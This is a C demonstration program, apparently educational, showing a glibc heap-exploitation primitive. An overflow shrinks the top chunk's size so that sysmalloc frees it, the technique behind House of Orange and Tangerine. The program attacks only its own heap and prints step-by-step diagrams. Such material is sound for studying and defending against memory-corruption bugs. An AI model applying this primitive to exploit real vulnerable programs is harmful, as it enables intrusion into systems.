#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// same for x86_64 and x86
#define MALLOC_ALIGN 0x10
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// fencepost are offsets removed from the top before freeing
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// target top chunk size that should be freed
#define CHUNK_FREED_SIZE 0x150
#define FREED_SIZE (CHUNK_FREED_SIZE-CHUNK_HDR_SZ)

/**
 * Tested on:
 *  + GLIBC 2.39 (x86_64, x86 & aarch64)
 *  + GLIBC 2.34 (x86_64, x86 & aarch64)
 *  + GLIBC 2.31 (x86_64, x86 & aarch64)
 *  + GLIBC 2.27 (x86_64, x86 & aarch64)
 *
 * sysmalloc allows us to free() the top chunk of heap to create nearly arbitrary bins,
 * which can be used to corrupt heap without needing to call free() directly.
 * This is achieved through sysmalloc calling _int_free to the top_chunk (wilderness),
 * if the top_chunk can't be merged during heap growth
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * This technique is used in House of Orange & Tangerine
 */
int main() {
  size_t allocated_size, *top_size_ptr, top_size, new_top_size, freed_top_size, *new, *old;
  // disable buffering
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // check if all chunks sizes are aligned
  assert((CHUNK_FREED_SIZE & MALLOC_MASK) == CHUNK_FREED_SIZE);

  puts("Constants:");
  printf("chunk header \t\t= 0x%lx\n", CHUNK_HDR_SZ);
  printf("malloc align \t\t= 0x%lx\n", MALLOC_ALIGN);
  printf("page align \t\t= 0x%lx\n", PAGESIZE);
  printf("fencepost size \t\t= 0x%lx\n", FENCEPOST);
  printf("freed size \t\t= 0x%lx\n", FREED_SIZE);

  printf("target top chunk size \t= 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_FREED_SIZE);

  // probe the current size of the top_chunk,
  // can be skipped if it is already known or predictable
  new = malloc(PROBE);
  top_size = new[(PROBE / SIZE_SZ) + 1];
  printf("first top size \t\t= 0x%lx\n", top_size);

  // calculate allocated_size
  allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
  allocated_size &= PAGE_MASK;
  allocated_size &= MALLOC_MASK;

  printf("allocated size \t\t= 0x%lx\n\n", allocated_size);

  puts("1. create initial malloc that will be used to corrupt the top_chunk (wilderness)");
  new = malloc(allocated_size);

  // use BOF or OOB to corrupt the top_chunk
  top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- initial malloc\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|      SIZE (0x%05lx)   |\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of current heap page\n\n",
         new - 2,
         top_size_ptr - 1,
         top_size - 1,
         top_size_ptr - 1 + (top_size / SIZE_SZ));

  puts("2. corrupt the size of top chunk to be less, but still page aligned");

  // make sure corrupt top size is page aligned, generally 0x1000
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;
  printf(""
         "----- %-14p ----\n"
         "|          NEW          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |   <- positive OOB (i.e. BOF)\n"
         "----- %-14p ----\n"
         "|         TOP           |   <- corrupt size of top chunk (wilderness)\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----   <- still page aligned\n"
         "|         ...           |\n"
         "----- %-14p ----   <- end of current heap page\n\n",
         new - 2,
         top_size_ptr - 1,
         new_top_size - 1,
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         top_size_ptr - 1 + (top_size / SIZE_SZ));


  puts("3. create an allocation larger than the remaining top chunk, to trigger heap growth");
  puts("The now corrupt top_chunk triggers sysmalloc to call _init_free on it");

  // remove fencepost from top_chunk, to get size that will be freed
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_FREED_SIZE);

  old = new;
  new = malloc(CHUNK_FREED_SIZE + 0x10);

  printf(""
         "----- %-14p ----\n"
         "|          OLD          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |\n"
         "----- %-14p ----\n"
         "|         FREED         |   <- old top got freed because it couldn't be merged\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----\n"
         "|       FENCEPOST       |   <- just some architecture depending padding\n"
         "----- %-14p ----   <- still page aligned\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of previous heap page\n"
         "|          NEW          |   <- new malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- end of current heap page\n\n",
         old - 2,
         top_size_ptr - 1,
         freed_top_size,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE/SIZE_SZ),
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         new - (MALLOC_ALIGN / SIZE_SZ));

  puts("...\n");

  puts("?. reallocated into the freed chunk");

  old = new;
  new = malloc(FREED_SIZE);

  assert((size_t) old > (size_t) new);

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- allocated into the freed chunk\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of previous heap page\n"
         "|          OLD          |   <- old malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- end of current heap page\n",
         new - 2,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE / SIZE_SZ),
         old - (MALLOC_ALIGN / SIZE_SZ));
}
